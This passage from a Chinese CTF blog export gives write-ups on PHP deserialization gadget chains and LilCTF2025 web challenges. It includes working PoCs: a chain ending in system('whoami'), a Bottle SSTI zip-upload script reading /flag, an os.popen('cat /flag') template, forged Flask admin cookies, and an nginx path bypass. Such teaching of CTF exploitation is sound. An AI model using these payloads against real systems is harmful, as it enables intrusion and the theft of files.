绕过异常抛出\n\n例如我们本地测试一下\n\n```php\n<?php\nclass test{\n    public $test = \"yes\";\n    public function __destruct() {\n        echo $this->test;\n    }\n}\n$a = new test();\nthrow new Exception(\"noooooob!!!\");\n```\n\n测试并没有输出yes，说明没触发该方法，这是因为throw函数自动回收了销毁的对象，导致destruct检测不到有东西销毁，从而导致无法触发魔术方法\n\n所以我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。\n\n例如我们这里用第一个方法，去构造数组对象并让数组对象为null\n\n```php\n<?php\nclass test{\n    public $test = \"yes\";\n    public function __destruct() {\n        echo $this->test;\n    }\n}\n$a = new test();\n$arr = serialize(array($a, null));\n//echo serialize($arr);\n//a:2:{i:0;O:4:\"test\":1:{s:4:\"test\";s:3:\"yes\";}i:1;N;}\n$poc = str_replace(\"i:1;N;\",\"i:0;N;\",$arr);\nunserialize($poc);\nthrow new Exception(\"noooooob!!!\");\n```\n\n成功输出yes，说明提前触发destruct了\n\n放一个包师傅写的题目\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass gc0{\n    public $num;\n    public function __destruct(){\n        echo $this->num.\"hello __destruct\";\n    }\n}\nclass gc1{\n    public $string;\n    public function __toString() {\n        echo \"hello __toString\";\n        $this->string->flag();\n        return 'useless';\n    }\n}\nclass gc2{\n    public $cmd;\n    public function flag(){\n        echo \"hello __flag()\";\n        eval($this->cmd);\n    }\n}\n$a=unserialize($_GET['code']);\nthrow new Exception(\"Garbage collection\");\n?>\n```\n\n可以看到这里有一个异常抛出，这会导致无法触发`__destruct`\n\n链子\n\n```php\ngc0::destruct->gc1::toString->gc2::flag\n```\n\npoc\n\n```php\n<?php\nclass gc0{\n    public $num;\n}\nclass gc1{\n    public $string;\n\n}\nclass gc2{\n    public $cmd;\n}\n$a = new gc0();\n$a -> num = new gc1();\n$a -> num -> string = new gc2();\n$a -> num -> string -> cmd = 'system(\"whoami\");';\n$arr = serialize(array($a,null));\n//echo serialize($arr);\n//a:2:{i:0;O:3:\"gc0\":1:{s:3:\"num\";O:3:\"gc1\":1:{s:6:\"string\";O:3:\"gc2\":1:{s:3:\"cmd\";s:17:\"system(\"whoami\");\";}}}i:1;N;}\n$poc = str_replace(\"i:1;N\",\"i:0;N\",$arr);\necho $poc;\n```\n\n![image-20250812172209874](../image/achieve/202411/PHP反序列化/image-20250812172209874.png)\n\n当然这里本质上就是让这个对象指向null，所以之前说到的删除大括号，修改属性个数的方法也是可以的\n\n```php\na:2:{i:0;O:3:\"gc0\":1:{s:3:\"num\";O:3:\"gc1\":1:{s:6:\"string\";O:3:\"gc2\":1:{s:3:\"cmd\";s:17:\"system(\"whoami\");\";}}}i:1;N;\n     \na:1:{i:0;O:3:\"gc0\":1:{s:3:\"num\";O:3:\"gc1\":1:{s:6:\"string\";O:3:\"gc2\":1:{s:3:\"cmd\";s:17:\"system(\"whoami\");\";}}}i:1;N;}\n```\n\n## __toString触发的场景\n\n- 将反序列化对象打印输出的时候会触发\n- 将反序列化对象和字符串进行拼接的时候会触发\n- 将反序列化对象和字符串进行弱比较(==)的时候会触发(因为PHP在弱比较的时候会进行类型的转换)\n- 将反序列化对象经过php字符串操作函数处理的时候，例如strlen()、str_replace()等\n\n## PHP原生类操作文件\n\n### 可遍历目录类\n\n可遍历目录类有以下几个：\n\n- DirectoryIterator 类\n- FilesystemIterator 类\n- GlobIterator 类\n\n#### DirectoryIterator 类\n\n![image-20250813145013094](../image/achieve/202411/PHP反序列化/image-20250813145013094.png)\n\nDirectoryIterator类为查看文件系统目录的内容提供了一个简单的接口。该类的构造方法将会创建一个指定目录的迭代器。\n\n**当执行到echo函数时，会触发DirectoryIterator类中的 `__toString()` 方法，输出指定目录里面经过排序之后的第一个文件名**\n\n- 利用 DirectoryIterator 类遍历指定目录里的文件\n\n写个demo\n\n```php\n<?php\n$dir = new DirectoryIterator('/');\necho $dir;\n```\n\n![image-20250813144641175](../image/achieve/202411/PHP反序列化/image-20250813144641175.png)\n\n显示出一个Windows中每个分区都会有的一个$Recycle.Bin文件\n\n```php\n<?php\n$dir=new DirectoryIterator(\"glob://./*.php\");\necho $dir;\n```\n\n![image-20250813144825995](../image/achieve/202411/PHP反序列化/image-20250813144825995.png)\n\n我们也可以搭配glob://去使用，但其实这里始终都不太方便看\n\n如果想输出全部的文件名我们还需要对$dir对象进行遍历\n\n```php\n<?php\n$dir=new DirectoryIterator(\"./\");\nforeach($dir as $f){\n    echo($f.\"\\n\");\n    //echo($f->__toString().'<br>');\n}\n```\n\n![image-20250813144929996](../image/achieve/202411/PHP反序列化/image-20250813144929996.png)\n\n#### FilesystemIterator 类\n\nFilesystemIterator 类与 DirectoryIterator 类相同，因为这两个是父子类的关系，这里就不细说了\n\n![image-20250813145301811](../image/achieve/202411/PHP反序列化/image-20250813145301811.png)\n\n#### GlobIterator 类\n\n![image-20250813145402993](../image/achieve/202411/PHP反序列化/image-20250813145402993.png)\n\n这个类也可以遍历一个文件目录，但是这个类的行为类似于我们的glob函数，可以通过匹配的方式去查找文件路径，所以使用这个类的化就不需要用`glob://`了\n\n写个demo\n\n```php\n<?php\n$dir=new GlobIterator(\"*.php\");\necho $dir;\n//1.php\n```\n\n","tags":["PHP反序列化"],"categories":["PHP反序列化"]},{"title":"LilCTF2025wp","url":"/2025/08/09/LilCTF2025wp/","content":"\n## 预热赛\n\n### 接力！TurboFlash\n\n题目：这波 Nginx 和 Flask 好像配合得不是很好。\n\n然后附件给了一个nginx的配置文件和python源码\n\npython源码\n\n```python\n# pylint: disable=missing-module-docstring,missing-function-docstring\n\nimport os\nfrom flask import Flask\n\napp = Flask(__name__)\n\n\n@app.route(\"/\")\ndef index():\n    return \"<h1>Hello, CTFer!</h1>\"\n\n\n@app.route(\"/secret\")\ndef secret():\n    return os.getenv(\"LILCTF_FLAG\", \"LILCTF{default}\")\n\n\nif __name__ == \"__main__\":\n    app.run(\"0.0.0.0\", 8080, debug=False)\n\n```\n\n逻辑很简单，只要访问到/secret上就能拿到flag，但是访问了出现403\n\n然后看看配置文件吧\n\n```nginx\nserver {\n    listen       80;\n    server_name  localhost;\n\n    location ~* ^/secret/?$ {\n        deny all;\n        return 403;\n    }\n\n    location ~* ^/secret/ {\n        deny all;\n        return 403;\n    }\n\n    location / {\n        proxy_pass http://127.0.0.1:8080;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n```\n\n写了两个路由匹配规则，且是不区分大小写的(`~*`)，特意去翻了一下nginx路由匹配规则\n\n```nginx\n＝   精确匹配               （优先级最高）\n^~   精确前缀匹配            （优先级仅次于=）\n~    区分大小写的正则匹配     （优先级次于^~）\n~*   不区分大小写的正则匹配    （优先级次于^~）\n/uri 普通前缀匹配            （优先级次于正则）\n/    通用匹配               （优先级最低）\n```\n\n这里的话只要`/secret`和`/secret/`的路由都会拒绝访问，这时候就需要绕过限制路径了\n\n在先知翻到一篇文章https://xz.aliyun.com/news/14403\n\n其实就是用一个python处理空格的逻辑去绕过nginx的解析URL规则\n\n![image-20250809205153119](../image/achieve/202411/LilCTF2025/image-20250809205153119.png)\n\n这里可以看到\\85和\\a0都是可以被当成空白字符处理，所以直接发包时候添加就行了\n\n![image-20250809195438838](../image/achieve/202411/LilCTF2025/image-20250809195438838.png)\n\n![image-20250809205334135](../image/achieve/202411/LilCTF2025/image-20250809205334135.png)\n\n最后放一个师傅图里面的绕过字符\n\n![image-20250809205613548](../image/achieve/202411/LilCTF2025/image-20250809205613548.png)\n\n## 正式赛\n\n### blade_cc\n\n一个jar包，下下来看一下，先看控制器处理逻辑\n\n在com\\n1ght\\controller\\IndexController中\n\n```java\npackage com.n1ght.controller;\n\nimport com.hellokaton.blade.annotation.Path;\nimport com.hellokaton.blade.annotation.route.GET;\nimport com.hellokaton.blade.annotation.route.POST;\nimport com.hellokaton.blade.mvc.http.Request;\nimport com.hellokaton.blade.server.NettyHttpConst;\nimport com.n1ght.util.N1ghtObjectInputStream;\nimport io.netty.buffer.ByteBuf;\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\n\n@Path\n/* loaded from: app.jar:com/n1ght/controller/IndexController.class */\npublic class IndexController {\n    @GET({NettyHttpConst.SLASH})\n    public String index() throws Exception {\n        return \"index.html\";\n    }\n\n    @POST({\"/challenge\"})\n    public String challenge(Request request) throws IOException, ClassNotFoundException {\n        ByteBuf body = request.body();\n        byte[] bytes = new byte[body.readableBytes()];\n        body.getBytes(body.readerIndex(), bytes);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        new N1ghtObjectInputStream(byteArrayInputStream).readObject();\n        return \"index.html\";\n    }\n}\n```\n\n可以看到这里有一个readObject的反序列化调用，跟进一下N1ghtObjectInputStream类\n\n```java\npackage com.n1ght.util;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InvalidClassException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectStreamClass;\n\n/* loaded from: app.jar:com/n1ght/util/N1ghtObjectInputStream.class */\npublic class N1ghtObjectInputStream extends ObjectInputStream {\n    public N1ghtObjectInputStream(InputStream in) throws IOException {\n        super(in);\n    }\n\n    @Override // java.io.ObjectInputStream\n    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {\n        String className = desc.getName();\n        String[] denyClasses = {\"java.net.InetAddress\", \"sun.rmi.transport.tcp.TCPTransport\", \"sun.rmi.transport.tcp.TCPEndpoint\", \"sun.rmi.transport.LiveRef\", \"sun.rmi.server.UnicastServerRef\", \"sun.rmi.server.UnicastRemoteObject\", \"org.apache.commons.collections.map.TransformedMap\", \"org.apache.commons.collections.functors.ChainedTransformer\", \"org.apache.commons.collections.functors.InstantiateTransformer\", \"org.apache.commons.collections.map.LazyMap\", \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\", \"org.apache.commons.collections.functors.ConstantTransformer\", \"org.apache.commons.collections.functors.MapTransformer\", \"org.apache.commons.collections.functors.FactoryTransformer\", \"org.apache.commons.collections.functors.InstantiateFactory\", \"org.apache.commons.collections.keyvalue.TiedMapEntry\", \"javax.management.BadAttributeValueExpException\", \"org.apache.commons.collections.map.DefaultedMap\", \"org.apache.commons.collections.bag.TreeBag\", \"org.apache.commons.collections.comparators.TransformingComparator\", \"org.apache.commons.collections.functors.TransformerClosure\", \"java.util.Hashtable\", \"java.util.HashMap\", \"java.net.URL\", \"com.sun.rowset.JdbcRowSetImpl\", \"java.security.SignedObject\"};\n        for (String denyClass : denyClasses) {\n            if (className.startsWith(denyClass)) {\n                throw new InvalidClassException(\"Unauthorized deserialization attempt\", className);\n            }\n        }\n        return super.resolveClass(desc);\n    }\n}\n```\n\n过滤的还是蛮多的，先看看有哪些依赖吧\n\n分别在META-INF\\maven的各个依赖的pom.properties中看一下版本信息\n\n![image-20250815104054354](../image/achieve/202411/LilCTF2025/image-20250815104054354.png)\n\ncommon-collections是用的3.2.1的，看看有没有可利用的，但是发现很多都禁了emmmm。。。\n\n### ez_bottle\n\n源码\n\n```python\nfrom bottle import route, run, template, post, request, static_file, error\nimport os\nimport zipfile\nimport hashlib\nimport time\n\n# hint: flag in /flag , have a try\n\nUPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads')\nos.makedirs(UPLOAD_DIR, exist_ok=True)\n\nSTATIC_DIR = os.path.join(os.path.dirname(__file__), 'static')\nMAX_FILE_SIZE = 1 * 1024 * 1024\n\nBLACK_DICT = [\"{\", \"}\", \"os\", \"eval\", \"exec\", \"sock\", \"<\", \">\", \"bul\", \"class\", \"?\", \":\", \"bash\", \"_\", \"globals\",\n              \"get\", \"open\"]\n\n\ndef contains_blacklist(content):\n    return any(black in content for black in BLACK_DICT)\n\n\ndef is_symlink(zipinfo):\n    return (zipinfo.external_attr >> 16) & 0o170000 == 0o120000\n\n\ndef is_safe_path(base_dir, target_path):\n    return os.path.realpath(target_path).startswith(os.path.realpath(base_dir))\n\n\n@route('/')\ndef index():\n    return static_file('index.html', root=STATIC_DIR)\n\n\n@route('/static/<filename>')\ndef server_static(filename):\n    return static_file(filename, root=STATIC_DIR)\n\n\n@route('/upload')\ndef upload_page():\n    return static_file('upload.html', root=STATIC_DIR)\n\n\n@post('/upload')\ndef upload():\n    zip_file = request.files.get('file')\n    if not zip_file or not zip_file.filename.endswith('.zip'):\n        return 'Invalid file. Please upload a ZIP file.'\n\n    if len(zip_file.file.read()) > MAX_FILE_SIZE:\n        return 'File size exceeds 1MB. Please upload a smaller ZIP file.'\n\n    zip_file.file.seek(0)\n\n    current_time = str(time.time())\n    unique_string = zip_file.filename + current_time\n    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()\n    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)\n    os.makedirs(extract_dir)\n\n    zip_path = os.path.join(extract_dir, 'upload.zip')\n    zip_file.save(zip_path)\n\n    try:\n        with zipfile.ZipFile(zip_path, 'r') as z:\n            for file_info in z.infolist():\n                if is_symlink(file_info):\n                    return 'Symbolic links are not allowed.'\n\n                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))\n                if not is_safe_path(extract_dir, real_dest_path):\n                    return 'Path traversal detected.'\n\n            z.extractall(extract_dir)\n    except zipfile.BadZipFile:\n        return 'Invalid ZIP file.'\n\n    files = os.listdir(extract_dir)\n    files.remove('upload.zip')\n\n    return template(\"文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}\",\n                    files=\", \".join(files), md5=md5_hash, first_file=files[0] if files else \"nofile\")\n\n\n@route('/view/<md5>/<filename>')\ndef view_file(md5, filename):\n    file_path = os.path.join(UPLOAD_DIR, md5, filename)\n    if not os.path.exists(file_path):\n        return \"File not found.\"\n\n    with open(file_path, 'r', encoding='utf-8') as f:\n        content = f.read()\n\n    if contains_blacklist(content):\n        return \"you are hacker!!!nonono!!!\"\n\n    try:\n        return template(content)\n    except Exception as e:\n        return f\"Error rendering template: {str(e)}\"\n\n\n@error(404)\ndef error404(error):\n    return \"bbbbbboooottle\"\n\n\n@error(403)\ndef error403(error):\n    return \"Forbidden: You don't have permission to access this resource.\"\n\n\nif __name__ == '__main__':\n    run(host='127.0.0.1', port=5000, debug=False)\n\n```\n\n这里的话其实思路很明确了，文件上传只能传zip文件，然后后端会解压这个zip文件并提取里面的文本内容并将保存的文件路径返回给用户，在`@route('/view/<md5>/<filename>')`中有一个很明显的ssti，所以我们的思路就是上传一个zip文件然后打ssti\n\n看一下这里的黑名单\n\n```python\nBLACK_DICT = [\"{\", \"}\", \"os\", \"eval\", \"exec\", \"sock\", \"<\", \">\", \"bul\", \"class\", \"?\", \":\", \"bash\", \"_\", \"globals\",\"get\", \"open\"]\n```\n\n这里的话主要是在于花括号怎么绕过，后面发现bottle自己的一套模板渲染方法里面能解析`%%`这种条件语句，那直接打就行了\n\n给一下poc吧，其实poc还是很简单的\n\n```python\nimport zipfile\nimport requests\nimport io\n\ntarget_url = \"http://challenge.xinshi.fun:46078/upload\"\n\npayload = r\"\"\"% x= vars()['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x6f\\x70\\x65\\x6e']('/flag').read()\n% f= vars()['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x6f\\x70\\x65\\x6e']('./static/flag.txt','w')\n% f.write(x)\n% f.flush()\n\"\"\"\n\npoc_zip = io.BytesIO()\nwith zipfile.ZipFile(poc_zip, mode='w',compression=zipfile.ZIP_DEFLATED) as z:\n    z.writestr(\"poc.txt\", payload) #操作内存需要writestr\n\npoc_zip.seek(0) #将内存指针移到开头\n\nfiles = {\n    \"file\" : (\"poc.zip\", poc_zip, \"application/zip\")\n}\nres = requests.post(target_url, files=files)\n\nprint(\"响应状态码\",res.status_code)\nprint(\"响应内容\",res.text)\n```\n\n上传后访问一下文件渲染一下，之后访问flag.txt就行了\n\n后面复现的时候发现还有一个做法，就是bottle中有一个include语法可以解析导入的tpl模板文件，然后我们可以写两个zip文件\n\n```python\na.tpl\n%import os\n{{! os.popen('cat /flag').read() }}\n\nb.tpl\n%include('uploads/[返回路径]/a.tpl')\n```\n\n这个也是从一个师傅那边学到的，关于为什么的话我写在另一篇关于bottle的模板解析的文章里了\n\n### Ekko_note\n\n源码\n\n```python\n# -*- encoding: utf-8 -*-\n'''\n@File    :   app.py\n@Time    :   2066/07/05 19:20:29\n@Author  :   Ekko exec inc. 某牛马程序员 \n'''\nimport os\nimport time\nimport uuid\nimport requests\n\nfrom functools import wraps\nfrom datetime import datetime\nfrom secrets import token_urlsafe\nfrom flask_sqlalchemy import SQLAlchemy\nfrom werkzeug.security import generate_password_hash, check_password_hash\nfrom flask import Flask, render_template, redirect, url_for, request, flash, session\n\nSERVER_START_TIME = time.time()\n\n\n# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。\n# 反正整个程序没有一个地方用到random库。应该没有什么问题。\nimport random\nrandom.seed(SERVER_START_TIME)\n\n\nadmin_super_strong_password = token_urlsafe()\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'your-secret-key-here'\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'\napp.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n\ndb = SQLAlchemy(app)\n\nclass User(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(20), unique=True, nullable=False)\n    email = db.Column(db.String(120), unique=True, nullable=False)\n    password = db.Column(db.String(60), nullable=False)\n    is_admin = db.Column(db.Boolean, default=False)\n    time_api = db.Column(db.String(200), default='https://api.uuni.cn//api/time')\n\n\nclass PasswordResetToken(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)\n    token = db.Column(db.String(36), unique=True, nullable=False)\n    used = db.Column(db.Boolean, default=False)\n\n\ndef padding(input_string):\n    byte_string = input_string.encode('utf-8')\n    if len(byte_string) > 6: byte_string = byte_string[:6]\n    padded_byte_string = byte_string.ljust(6, b'\\x00')\n    padded_int = int.from_bytes(padded_byte_string, byteorder='big')\n    return padded_int\n\nwith app.app_context():\n    db.create_all()\n    if not User.query.filter_by(username='admin').first():\n        admin = User(\n            username='admin',\n            email='admin@example.com',\n            password=generate_password_hash(admin_super_strong_password),\n            is_admin=True\n        )\n        db.session.add(admin)\n        db.session.commit()\n\ndef login_required(f):\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        if 'user_id' not in session:\n            flash('请登录', 'danger')\n            return redirect(url_for('login'))\n        return f(*args, **kwargs)\n    return decorated_function\n\ndef admin_required(f):\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        if 'user_id' not in session:\n            flash('请登录', 'danger')\n            return redirect(url_for('login'))\n        user = User.query.get(session['user_id'])\n        if not user.is_admin:\n            flash('你不是admin', 'danger')\n            return redirect(url_for('home'))\n        return f(*args, **kwargs)\n    return decorated_function\n\ndef check_time_api():\n    user = User.query.get(session['user_id'])\n    try:\n        response = requests.get(user.time_api)\n        data = response.json()\n        datetime_str = data.get('date')\n        if datetime_str:\n            print(datetime_str)\n            current_time = datetime.fromisoformat(datetime_str)\n            return current_time.year >= 2066\n    except Exception as e:\n        return None\n    return None\n@app.route('/')\ndef home():\n    return render_template('home.html')\n\n@app.route('/server_info')\n@login_required\ndef server_info():\n    return {\n        'server_start_time': SERVER_START_TIME,\n        'current_time': time.time()\n    }\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        email = request.form.get('email')\n        password = request.form.get('password')\n        confirm_password = request.form.get('confirm_password')\n\n        if password != confirm_password:\n            flash('密码错误', 'danger')\n            return redirect(url_for('register'))\n\n        existing_user = User.query.filter_by(username=username).first()\n        if existing_user:\n            flash('已经存在这个用户了', 'danger')\n            return redirect(url_for('register'))\n\n        existing_email = User.query.filter_by(email=email).first()\n        if existing_email:\n            flash('这个邮箱已经被注册了', 'danger')\n            return redirect(url_for('register'))\n\n        hashed_password = generate_password_hash(password)\n        new_user = User(username=username, email=email, password=hashed_password)\n        db.session.add(new_user)\n        db.session.commit()\n\n        flash('注册成功，请登录', 'success')\n        return redirect(url_for('login'))\n\n    return render_template('register.html')\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        user = User.query.filter_by(username=username).first()\n        if user and check_password_hash(user.password, password):\n            session['user_id'] = user.id\n            session['username'] = user.username\n            session['is_admin'] = user.is_admin\n            flash('登陆成功，欢迎!', 'success')\n            return redirect(url_for('dashboard'))\n        else:\n            flash('用户名或密码错误!', 'danger')\n            return redirect(url_for('login'))\n\n    return render_template('login.html')\n\n@app.route('/logout')\n@login_required\ndef logout():\n    session.clear()\n    flash('成功登出', 'info')\n    return redirect(url_for('home'))\n\n@app.route('/dashboard')\n@login_required\ndef dashboard():\n    return render_template('dashboard.html')\n\n@app.route('/forgot_password', methods=['GET', 'POST'])\ndef forgot_password():\n    if request.method == 'POST':\n        email = request.form.get('email')\n        user = User.query.filter_by(email=email).first()\n        if user:\n            # 选哪个UUID版本好呢，好头疼 >_<\n            # UUID v8吧，看起来版本比较新\n            token = str(uuid.uuid8(a=padding(user.username))) # 可以自定义参数吗原来，那把username放进去吧\n            reset_token = PasswordResetToken(user_id=user.id, token=token)\n            db.session.add(reset_token)\n            db.session.commit()\n            # TODO：写一个SMTP服务把token发出去\n            flash(f'密码恢复token已经发送，请检查你的邮箱', 'info')\n            return redirect(url_for('reset_password'))\n        else:\n            flash('没有找到该邮箱对应的注册账户', 'danger')\n            return redirect(url_for('forgot_password'))\n\n    return render_template('forgot_password.html')\n\n@app.route('/reset_password', methods=['GET', 'POST'])\ndef reset_password():\n    if request.method == 'POST':\n        token = request.form.get('token')\n        new_password = request.form.get('new_password')\n        confirm_password = request.form.get('confirm_password')\n\n        if new_password != confirm_password:\n            flash('密码不匹配', 'danger')\n            return redirect(url_for('reset_password'))\n\n        reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first()\n        if reset_token:\n            user = User.query.get(reset_token.user_id)\n            user.password = generate_password_hash(new_password)\n            reset_token.used = True\n            db.session.commit()\n            flash('成功重置密码！请重新登录', 'success')\n            return redirect(url_for('login'))\n        else:\n            flash('无效或过期的token', 'danger')\n            return redirect(url_for('reset_password'))\n\n    return render_template('reset_password.html')\n\n@app.route('/execute_command', methods=['GET', 'POST'])\n@login_required\ndef execute_command():\n    result = check_time_api()\n    if result is None:\n        flash(\"API死了啦，都你害的啦。\", \"danger\")\n        return redirect(url_for('dashboard'))\n\n    if not result:\n        flash('2066年才完工哈，你可以穿越到2066年看看', 'danger')\n        return redirect(url_for('dashboard'))\n\n    if request.method == 'POST':\n        command = request.form.get('command')\n        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。\n        return redirect(url_for('execute_command'))\n\n    return render_template('execute_command.html')\n\n@app.route('/admin/settings', methods=['GET', 'POST'])\n@admin_required\ndef admin_settings():\n    user = User.query.get(session['user_id'])\n    \n    if request.method == 'POST':\n        new_api = request.form.get('time_api')\n        user.time_api = new_api\n        db.session.commit()\n        flash('成功更新API！', 'success')\n        return redirect(url_for('admin_settings'))\n\n    return render_template('admin_settings.html', time_api=user.time_api)\n\nif __name__ == '__main__':\n    app.run(debug=False, host=\"0.0.0.0\")\n\n```\n\n这里的话感觉是需要爆种子拿token的，但是一直没想到怎么去实现\n\n先看看登录逻辑\n\n```python\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        user = User.query.filter_by(username=username).first()\n        if user and check_password_hash(user.password, password):\n            session['user_id'] = user.id\n            session['username'] = user.username\n            session['is_admin'] = user.is_admin\n            flash('登陆成功，欢迎!', 'success')\n            return redirect(url_for('dashboard'))\n        else:\n            flash('用户名或密码错误!', 'danger')\n            return redirect(url_for('login'))\n\n    return render_template('login.html')\n```\n\n这里的话会检验session字段中的三个数值，然后我们注册一个账号并伪造admin身份\n\n![image-20250818130424230](../image/achieve/202411/LilCTF2025/image-20250818130424230.png)\n\n在f12中拿到session并解密一下\n\n![image-20250818130521388](../image/achieve/202411/LilCTF2025/image-20250818130521388.png)\n\n这里的话因为key给了，所以直接伪造admin\n\n```bash\nroot@VM-16-12-ubuntu:/# flask-unsign --sign --cookie \"{'user_id': 1, 'username': 'admin', 'is_admin': True}\" --secret 'your-secret-key-here'\neyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWV9.aKK05w.oPFkYigmBze1J713KP09DTKy03A\n```\n\n看到多了一个管理员设置，点进去看到有一个api接口\n\n```python\nclass User(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(20), unique=True, nullable=False)\n    email = db.Column(db.String(120), unique=True, nullable=False)\n    password = db.Column(db.String(60), nullable=False)\n    is_admin = db.Column(db.Boolean, default=False)\n    time_api = db.Column(db.String(200), default='https://api.uuni.cn//api/time')\n```\n\n访问一下这个时间api看看\n\n```json\n{\"date\":\"2025-08-18 13:09:31\",\"weekday\":\"星期一\",\"timestamp\":1755493771,\"remark\":\"任何情况请联系QQ:3295320658  微信服务号:顺成网络\"}\n```\n\n然后在源码中有一个检查时间api的函数\n\n```python\ndef check_time_api():\n    user = User.query.get(session['user_id'])\n    try:\n        response = requests.get(user.time_api)\n        data = response.json()\n        datetime_str = data.get('date')\n        if datetime_str:\n            print(datetime_str)\n            current_time = datetime.fromisoformat(datetime_str)\n            return current_time.year >= 2066\n    except Exception as e:\n        return None\n    return None\n```\n\n这里的话会检查time_api返回的时间，并判断是否大于2066年，然后看看这个函数的用法\n\n```python\n@app.route('/execute_command', methods=['GET', 'POST'])\n@login_required\ndef execute_command():\n    result = check_time_api()\n    if result is None:\n        flash(\"API死了啦，都你害的啦。\", \"danger\")\n        return redirect(url_for('dashboard'))\n\n    if not result:\n        flash('2066年才完工哈，你可以穿越到2066年看看', 'danger')\n        return redirect(url_for('dashboard'))\n\n    if request.method == 'POST':\n        command = request.form.get('command')\n        os.system(command) # 什么？你说安全？不是，都说了还没完工催什么。\n        return redirect(url_for('execute_command'))\n\n    return render_template('execute_command.html')\n```\n\n在这个可以执行命令的函数下先是检查了这个time，意思就是如果时间达到2066年才能通过这个函数去执行任意命令\n\n然后我们看看这个路由\n```python\n@app.route('/admin/settings', methods=['GET', 'POST'])\n@admin_required\ndef admin_settings():\n    user = User.query.get(session['user_id'])\n    \n    if request.method == 'POST':\n        new_api = request.form.get('time_api')\n        user.time_api = new_api\n        db.session.commit()\n        flash('成功更新API！', 'success')\n        return redirect(url_for('admin_settings'))\n```\n\n这里的话可以看到time_api是可控的，那我们在自己的vps上构造一个试一下\n\n![image-20250818131800757](../image/achieve/202411/LilCTF2025/image-20250818131800757.png)\n\n更新成功后去执行命令页面，但是这里执行命令没有回显\n\n```python\nsleep 5\n```\n\n用一个sleep去测试一下，发现是执行了的但是没回显，但是这里可以创建static文件夹，直接打就行了\n\n```python\nmkdir static;ls>static/1.txt\n```\n\n![image-20250818132131646](../image/achieve/202411/LilCTF2025/image-20250818132131646.png)\n\n那么直接打就行了\n\n![image-20250818132214668](../image/achieve/202411/LilCTF2025/image-20250818132214668.png)\n","tags":["LilCTF2025"],"categories":["赛题wp"]},{"title":"2025年春秋杯夏季赛","url":"/2025/08/07/2025年春秋杯夏季赛/","content":"\n比赛的时候刚好约了朋友出去玩，回来之后只拿到了反序列化的这道题，那就只能写写这道题了\n\n## ez_pop\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass class_A\n{\n    public $s;\n    public $a;\n\n    public function __toString()\n    {\n        echo \"2 A <br>\";\n        $p = $this->a;\n        return $this->s->$p;\n    }\n}\n\nclass class_B\n{\n    public $c;\n    public $d;\n\n    function is_method($input){\n        if (strpos($input, '::') === false) {\n            return false;\n        }\n    \n        [$class, $method] = explode('::', $input, 2);\n    \n        if (!class_exists($class, false)) {\n            return false;\n        }\n    \n        if (!method_exists($class, $method)) {\n            return false;\n        }\n    \n        try {\n            $refMethod = new ReflectionMethod($class, $method);\n            return $refMethod->isInternal();\n        } catch (ReflectionException $e) {\n            return false;\n        }\n    }\n    \n    function is_class($input){\n        if (strpos($input, '::') !== false) {\n            return $this->is_method($input);\n        }\n    \n        if (!class_exists($input, false)) {\n            return false;\n        }\n    \n        try {\n            return (new ReflectionClass($input))->isInternal();\n        } catch (ReflectionException $e) {\n            return false;\n        }\n    }\n    public function __get($name)\n    {\n        echo \"2 B <br>\";\n\n        $a = $_POST['a'];\n        $b = $_POST;\n        $c = $this->c;\n        $d = $this->d;\n        if (isset($b['a'])) {\n            unset($b['a']);\n        }\n        if ($this->is_class($a)){\n            call_user_func($a, $b)($c)($d);\n        }else{\n            die(\"你真该请教一下oSthinggg哥哥了\");\n        }\n    }\n}\n\nclass class_C\n{\n    public $c;\n\n    public function __destruct()\n    {\n        echo \"2 C <br>\";\n        echo $this->c;\n    }\n}\n\n\nif (isset($_GET['un'])) {\n    $a = unserialize($_GET['un']);\n    throw new Exception(\"noooooob!!!你真该请教一下万能的google哥哥了\");\n}\n\n```\n\nphp反序列化，先把链子搞出来吧\n\n```php\nclass_C::__destruct()->class_A::__toString()->class_B::__get()\n```\n\n然后我们看`__get()`方法\n\n```php\n    public function __get($name)\n    {\n        echo \"2 B <br>\";\n\n        $a = $_POST['a'];\n        $b 